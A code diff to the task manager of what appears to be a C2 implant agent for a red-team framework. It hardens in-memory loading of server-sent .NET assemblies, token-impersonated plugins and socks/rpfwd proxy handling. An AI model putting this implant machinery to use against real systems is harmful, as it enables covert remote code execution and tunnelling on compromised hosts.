@@ -13,12 +13,20 @@ namespace Agent.Managers
         public IAssemblyManager assemblyManager { get; set; }
         private IMessageManager messageManager { get; set; }
         private ITokenManager tokenManager { get; set; }
+        private readonly TimeSpan proxyDatagramTimeout;
+        private readonly SemaphoreSlim proxyHandlerSlots = new(16, 16);
         public TaskManager(ILogger logger, IAssemblyManager assemblyManager, IMessageManager messageManager, ITokenManager tokenManager)
+            : this(logger, assemblyManager, messageManager, tokenManager, TimeSpan.FromSeconds(30))
+        {
+        }
+
+        public TaskManager(ILogger logger, IAssemblyManager assemblyManager, IMessageManager messageManager, ITokenManager tokenManager, TimeSpan proxyDatagramTimeout)
         {
             this.logger = logger;
             this.assemblyManager = assemblyManager;
             this.messageManager = messageManager;
             this.tokenManager = tokenManager;
+            this.proxyDatagramTimeout = proxyDatagramTimeout;
         }
 
         public async Task StartTaskAsync(ServerJob job)
@@ -33,54 +41,116 @@ namespace Agent.Managers
             switch (job.task.command)
             {
                 case "load":
-                    LoadCommand loadCommand = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
-                    if (loadCommand is not null)
+                    LoadCommand? loadCommand;
+                    try
                     {
-                        byte[] buf = Misc.Base64DecodeToByteArray(loadCommand.asm);
-                        if (buf.Length > 0)
+                        loadCommand = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
+                    }
+                    catch (Exception e) when (e is JsonException or FormatException or ArgumentNullException)
+                    {
+                        FailMalformedLoad(job, e.Message);
+                        break;
+                    }
+
+                    if (loadCommand is null)
+                    {
+                        FailMalformedLoad(job, "Load parameters cannot be null.");
+                        break;
+                    }
+
+                    if (string.IsNullOrWhiteSpace(loadCommand.command) || string.IsNullOrWhiteSpace(loadCommand.asm))
+                    {
+                        FailMalformedLoad(job, "Plugin command and assembly payload are required.");
+                        break;
+                    }
+
+                    byte[] loadBuffer;
+                    try
+                    {
+                        loadBuffer = Misc.Base64DecodeToByteArray(loadCommand.asm);
+                    }
+                    catch (FormatException e)
+                    {
+                        FailMalformedLoad(job, e.Message);
+                        break;
+                    }
+                    if (loadBuffer.Length == 0)
+                    {
+                        FailMalformedLoad(job, "Assembly payload cannot be empty.");
+                        break;
+                    }
+
+                    if (this.assemblyManager.LoadPluginAsync(job.task.id, loadCommand.command, loadBuffer))
+                    {
+                        LoadTaskResponse cr = new LoadTaskResponse()
                         {
-                            if(this.assemblyManager.LoadPluginAsync(job.task.id, loadCommand.command, buf))
+                            completed = true,
+                            user_output = $"Loaded plugin {loadCommand.command}",
+                            task_id = job.task.id,
+                            commands = new List<CommandsResponse>()
                             {
-                                LoadTaskResponse cr = new LoadTaskResponse()
+                                new CommandsResponse()
                                 {
-                                    completed = true,
-                                    user_output = $"Loaded plugin {loadCommand.command}",
-                                    task_id = job.task.id,
-                                    commands = new List<CommandsResponse>()
-                                {
-                                    new CommandsResponse()
-                                    {
-                                        action = "add",
-                                        cmd = loadCommand.command,
-                                    }
+                                    action = "add",
+                                    cmd = loadCommand.command,
                                 }
-                                };
-                                this.messageManager.AddTaskResponse(cr.ToJson());
                             }
-                            else
-                            {
-                                LoadTaskResponse cr = new LoadTaskResponse()
-                                {
-                                    completed = true,
-                                    user_output = $"Failed to load plugin {loadCommand.command}",
-                                    task_id = job.task.id,
-                                    commands = new List<CommandsResponse>()
-                                };
-                                this.messageManager.AddTaskResponse(cr.ToJson());
-                            }
-                        }
+                        };
+                        this.messageManager.AddTaskResponse(cr.ToJson(), job.task.id, cr.completed);
+                    }
+                    else
+                    {
+                        LoadTaskResponse cr = new LoadTaskResponse()
+                        {
+                            completed = true,
+                            user_output = $"Failed to load plugin {loadCommand.command}",
+                            task_id = job.task.id,
+                            commands = new List<CommandsResponse>()
+                        };
+                        this.messageManager.AddTaskResponse(cr.ToJson(), job.task.id, cr.completed);
                     }
                     break;
                 case "load-assembly":
-                    LoadCommand command = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
-                    if (command is not null)
+                    LoadCommand? command;
+                    try
                     {
-                        byte[] buf = Misc.Base64DecodeToByteArray(command.asm);
-                        if (buf.Length > 0)
-                        {
-                            this.assemblyManager.LoadAssemblyAsync(job.task.id, buf);
-                        }
+                        command = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
                     }
+                    catch (Exception e) when (e is JsonException or FormatException or ArgumentNullException)
+                    {
+                        FailMalformedLoad(job, e.Message);
+                        break;
+                    }
+
+                    if (command is null)
+                    {
+                        FailMalformedLoad(job, "Load parameters cannot be null.");
+                        break;
+                    }
+
+                    if (string.IsNullOrWhiteSpace(command.asm))
+                    {
+                        FailMalformedLoad(job, "Assembly payload is required.");
+                        break;
+                    }
+
+                    byte[] assemblyBuffer;
+                    try
+                    {
+                        assemblyBuffer = Misc.Base64DecodeToByteArray(command.asm);
+                    }
+                    catch (FormatException e)
+                    {
+                        FailMalformedLoad(job, e.Message);
+                        break;
+                    }
+                    if (assemblyBuffer.Length == 0)
+                    {
+                        FailMalformedLoad(job, "Assembly payload cannot be empty.");
+                        break;
+                    }
+
+                    this.assemblyManager.LoadAssemblyAsync(job.task.id, assemblyBuffer);
                     break;
                 default:
                     _ = Task.Run(async () =>
@@ -136,11 +206,29 @@ namespace Agent.Managers
                     break;
             }
         }
+
+        private void FailMalformedLoad(ServerJob job, string error)
+        {
+            this.messageManager.AddTaskResponse(new TaskResponse
+            {
+                task_id = job.task.id,
+                user_output = error,
+                status = "error",
+                completed = true,
+            });
+            this.messageManager.CompleteJob(job.task.id);
+        }
+
         public async Task HandleServerResponses(List<ServerTaskingResponse> responses)
         {
             List<Task> tasks = new List<Task>();
             foreach(var response in responses)
             {
+                if (response is null)
+                {
+                    continue;
+                }
+
                 ServerJob job;
 
                 if (!this.messageManager.TryGetJob(response.task_id, out job) || !this.assemblyManager.TryGetPlugin<IFilePlugin>(job.task.command, out var plugin))
@@ -155,56 +243,120 @@ namespace Agent.Managers
 
                 if (job.task.token > 0)
                 {
-                    tasks.Add(Task.Run(() => tokenManager.HandleFilePluginImpersonated(plugin, job, response)));
+                    tasks.Add(HandleFileResponse(
+                        () => tokenManager.HandleFilePluginImpersonated(plugin, job, response),
+                        response.task_id));
                     continue;
                 }
 
-                tasks.Add(Task.Run(() =>
-                {
-                    try
-                    {
-                        plugin.HandleNextMessage(response);
-                    }
-                    catch (Exception e)
-                    {
-                        messageManager.WriteLine(e.ToString(), response.task_id, true, "error");
-                    }
-                }));
+                tasks.Add(HandleFileResponse(() => plugin.HandleNextMessage(response), response.task_id));
             }
 
             await Task.WhenAll(tasks);
         }
+
+        private async Task HandleFileResponse(Func<Task> dispatch, string taskId)
+        {
+            try
+            {
+                await dispatch().ConfigureAwait(false);
+            }
+            catch (Exception e)
+            {
+                messageManager.WriteLine(e.ToString(), taskId, true, "error");
+            }
+        }
         public async Task HandleProxyResponses(string type, List<ServerDatagram> responses)
         {
-            List<Task> tasks = new List<Task>();
             if (!this.assemblyManager.TryGetPlugin<IProxyPlugin>(type, out var plugin))
             {
                 return;
             }
 
-            if (plugin is null)
+            if (plugin is null || responses is null)
             {
                 return;
             }
 
-            if(responses is null)
+            if (type.Equals("socks", StringComparison.OrdinalIgnoreCase) ||
+                type.Equals("rpfwd", StringComparison.OrdinalIgnoreCase))
             {
+                this.logger?.Debug($"Handling {responses.Count} {type} datagram(s)");
+            }
+            else
+            {
+                this.logger?.Debug($"Handling proxy datagram batch for plugin '{type}' ({responses.Count} item(s))");
+            }
+
+            await Parallel.ForEachAsync(
+                responses,
+                new ParallelOptions { MaxDegreeOfParallelism = 16 },
+                async (response, _) => await HandleProxyDatagram(plugin, response, proxyDatagramTimeout).ConfigureAwait(false))
+                .ConfigureAwait(false);
+        }
+
+        private async Task HandleProxyDatagram(IProxyPlugin plugin, ServerDatagram response, TimeSpan timeout)
+        {
+            if (!await proxyHandlerSlots.WaitAsync(timeout).ConfigureAwait(false))
+                return;
+
+            Task handling;
+            try
+            {
+                handling = plugin.HandleDatagram(response);
+            }
+            catch
+            {
+                proxyHandlerSlots.Release();
+                // Proxy frames are independent. A malformed frame must not fail the batch.
                 return;
             }
 
-            foreach (var response in responses)
+            Task completed = await Task.WhenAny(handling, Task.Delay(timeout)).ConfigureAwait(false);
+            if (completed != handling)
             {
-                tasks.Add(plugin.HandleDatagram(response));
-                //Task.Run(() => plugin.HandleDatagram(response));
+                _ = ReleaseProxySlotWhenComplete(handling);
+                return;
             }
-            await Task.WhenAll(tasks);
 
+            try
+            {
+                await handling.ConfigureAwait(false);
+            }
+            catch
+            {
+                // Proxy frames are independent. A malformed frame must not fail the batch.
+            }
+            finally
+            {
+                proxyHandlerSlots.Release();
+            }
+        }
+
+        private async Task ReleaseProxySlotWhenComplete(Task handling)
+        {
+            try
+            {
+                await handling.ConfigureAwait(false);
+            }
+            catch
+            {
+            }
+            finally
+            {
+                proxyHandlerSlots.Release();
+            }
         }
         public async Task HandleDelegateResponses(List<DelegateMessage> responses)
         {
             List<Task> tasks = new List<Task>();
             foreach(var response in responses)
             {
+                if (response is null)
+                {
+                    continue;
+                }
+
                 if (!this.assemblyManager.TryGetPlugin<IForwarderPlugin>(response.c2_profile, out var plugin))
                 {
                     continue;
@@ -228,6 +380,11 @@ namespace Agent.Managers
             List<Task> tasks = new List<Task>();
             foreach(var response in responses)
             {
+                if (response is null)
+                {
+                    continue;
+                }
+
                 ServerJob job;
 
                 if (!this.messageManager.TryGetJob(response.task_id, out job) || !this.assemblyManager.TryGetPlugin<IInteractivePlugin>(job.task.command, out var plugin))
